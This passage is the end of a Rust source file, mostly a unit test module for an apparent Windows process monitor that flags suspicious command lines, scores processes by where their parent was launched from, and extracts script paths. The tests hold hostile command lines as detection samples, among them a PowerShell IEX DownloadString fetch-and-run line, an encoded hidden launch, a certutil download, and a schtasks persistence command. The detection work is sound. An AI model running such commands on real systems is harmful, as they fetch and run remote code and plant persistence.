            persist_log();
        }
    });
}

#[cfg(test)]
mod tests {
    use super::*;
    fn origin(name: &str, location: &str, signed: Option<bool>) -> Proc {
        Proc { pid: 1, name: name.into(), path: String::new(), location: location.into(), signed, role: String::new() }
    }
    #[test]
    fn flags_from_command_lines() {
        let f = command_flags("powershell.exe", "powershell.exe -NoP -W Hidden -Enc SQBFAFgA");
        assert!(f.contains(&"encoded") && f.contains(&"hidden"));
        let f = command_flags("powershell.exe", "powershell -ExecutionPolicy Bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"");
        assert!(f.contains(&"bypass") && f.contains(&"exec-string") && f.contains(&"network"));
        assert!(command_flags("powershell.exe", "powershell.exe -NoProfile -NonInteractive -Command Get-Date").is_empty());
        assert!(command_flags("powershell.exe", "powershell -ex bypass").contains(&"bypass"));
        assert!(!command_flags("powershell.exe", "powershell -ex bypass").contains(&"encoded"));
        assert_eq!(command_flags("certutil.exe", "certutil -urlcache -f http://a/b c.exe"), vec!["network", "lolbin"]);
        assert_eq!(command_flags("schtasks.exe", "schtasks /create /tn x /tr y"), vec!["persistence"]);
        assert!(command_flags("cmd.exe", "cmd /c dir").is_empty());
    }
    #[test]
    fn verdicts() {
        let (_, _, v) = assess("cmd.exe", &[], Some(&origin("steam.exe", "programs", Some(true))), true, false);
        assert_eq!(v, "ok");
        let (s, f, v) = assess("powershell.exe", &["encoded", "hidden"], Some(&origin("upd.exe", "temp", Some(false))), false, false);
        assert_eq!(v, "suspicious");
        assert!(s >= 7 && f.contains(&"temp-origin".to_string()) && f.contains(&"background".to_string()));
        let (_, _, v) = assess("cmd.exe", &[], Some(&origin("winword.exe", "programs", Some(true))), true, false);
        assert_eq!(v, "notice");
        let (_, _, v) = assess("powershell.exe", &["network"], Some(&origin("winword.exe", "programs", Some(true))), false, false);
        assert_eq!(v, "suspicious");
        let (_, _, v) = assess("cmd.exe", &[], Some(&origin("tool.exe", "appdata", Some(false))), false, true);
        assert_eq!(v, "notice");
    }
    #[test]
    fn scripts() {
        assert_eq!(script_of("python.exe", r#""C:\Py\python.exe" -u "C:\Bots\my bot.py" --token x"#), "C:\\Bots\\my bot.py");
        assert_eq!(script_of("python.exe", "python -m http.server 80"), "модуль http.server");
        assert_eq!(script_of("python.exe", "python -c print(1)"), "(код прямо в командной строке)");
        assert_eq!(script_of("node.exe", "node --inspect C:\\a\\b.js arg"), "C:\\a\\b.js");
        assert_eq!(script_of("javaw.exe", "javaw -Xmx1g -jar D:\\Games\\mc.jar"), "D:\\Games\\mc.jar");
        assert_eq!(script_of("wscript.exe", "wscript.exe //B C:\\x\\y.vbs"), "C:\\x\\y.vbs");
    }
    #[test]
    fn locations() {
        assert_eq!(location_of("C:\\Windows\\System32\\cmd.exe"), "system");
        assert_eq!(location_of("C:\\Program Files\\Steam\\steam.exe"), "programs");
        assert_eq!(location_of("C:\\Users\\a\\AppData\\Local\\Temp\\x.exe"), "temp");
        assert_eq!(location_of("C:\\Users\\a\\Downloads\\setup.exe"), "temp");
        assert_eq!(location_of("C:\\Users\\a\\AppData\\Roaming\\x\\x.exe"), "appdata");
        assert_eq!(location_of("D:\\Games\\x.exe"), "other");
        assert_eq!(kind_of("cmd.exe"), Some("console"));
        assert_eq!(kind_of("notepad.exe"), None);
    }
}
